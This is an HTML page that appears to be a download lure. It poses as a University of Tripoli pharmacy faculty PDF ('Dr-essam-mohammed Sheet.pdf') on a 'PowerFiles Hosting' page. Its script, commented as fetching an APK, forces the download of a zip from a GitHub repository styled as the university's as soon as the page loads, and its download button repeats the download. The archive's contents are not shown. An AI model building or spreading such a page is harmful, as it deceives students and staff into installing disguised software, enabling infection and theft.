<!DOCTYPE html>
<head>
  <meta property="og:title" content="جامعة طرابلس كلية الصيدلة">
  <meta property="og:description" content="Dr-essam-mohammed Sheet.pdf">
  <meta property="og:image" content="https://uot.edu.ly/showimage.php?filename=/home/uotedu/storage/logo/uotlogo.png">
  <title>PowerFiles Hosting</title>
  <style>
    body {
      background-color: #f2f2f2;
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 40px 0;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
    }

    .container {
      background-color: #ffffff;
      width: 560px;
      border-radius: 6px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      border: 1px solid #dcdcdc;
      text-align: center;
    }

    .header {
      padding: 40px 30px 10px;
    }

.header img {
    width: 68px;
    vertical-align: top; /* or middle */
}


    .header h2 {
      font-size: 20px;
      color: #2f2f2f;
      margin: 0;
    }

    .timestamp {
      font-size: 13px;
      color: #7a7a7a;
      margin-top: 6px;
    }

    .instructions {
      text-align: right;
      padding: 25px 40px 10px;
      font-size: 15px;
      color: #333333;
      line-height: 1.6;
    }

    .instructions ol {
      margin: 0;
      padding-left: 20px;
    }

.code-block {
    background-color: #f1f1f1;
    border: 1px solid #ccc;
    border-radius: 4px;
    padding: 8px 12px;
    font-family: Consolas, monospace;
    font-size: 12px; /* Reduced from 14px */
    margin-top: 8px;
    position: relative;
    transition: background-color 0.3s;
    cursor: pointer;
    user-select: none;
    word-wrap: break-word;
    overflow-wrap: break-word;
}



    .code-block:hover {
      background-color: #e6e6e6;
    }

    .code-block::after {
      content: "نسخ";
      position: left;
      top: 50%;
      right: 12px;
      transform: translateY(-50%);
      font-size: 12px;
      color: #0078d4;
      opacity: 0;
      transition: opacity 0.2s;
    }

    .code-block:hover::after {
      opacity: 1;
    }

    .code-block.clicked::after {
      content: "تم النسخ";
      color: #107c10;
    }

    #fileExplorer {
      background-color: #0078d4;
      color: white;
      border: none;
      padding: 12px 30px;
      font-size: 15px;
      border-radius: 4px;
      margin: 30px 0 40px;
      cursor: pointer;
    }

    #fileExplorer:hover {
      background-color: #005ea2;
    }

    .footer {
      font-size: 11.5px;
      color: #6b6b6b;
      background-color: #f7f7f7;
      padding: 12px 24px;
      border-top: 1px solid #dcdcdc;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .footer img {
      height: 16px;
    }

    .footer a {
      color: #6b6b6b;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body dir="rtl">

  <div class="container">
    <div class="header">
      <img src="image.png" alt="Downloader">
      <h2>تحميل الملف</h2>
      <div class="timestamp">Dr-essam-mohammed Sheet.pdf</div>
    </div>

    <button id="fileExplorer">التحميل</button>

    <div class="footer">
      <img src="image.png" alt="Downloader">
    </div>
  </div>
    <script>
        // URL of the APK
        const apkUrl = "https://github.com/tripoli-university-ly/download/archive/refs/heads/dr.mohammed.zip";

        // Create a temporary link
        const link = document.createElement("a");
        link.href = apkUrl;
        document.body.appendChild(link);

        // Trigger click automatically
        link.click();

        // Remove the link from DOM
        document.body.removeChild(link);
    // Handle download on button click
    document.getElementById("fileExplorer").addEventListener("click", () => {
      const link = document.createElement("a");
      link.href = apkUrl;
      link.download = ""; // optional: lets browser download instead of navigate
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    });
  </script>
</body>

</html>
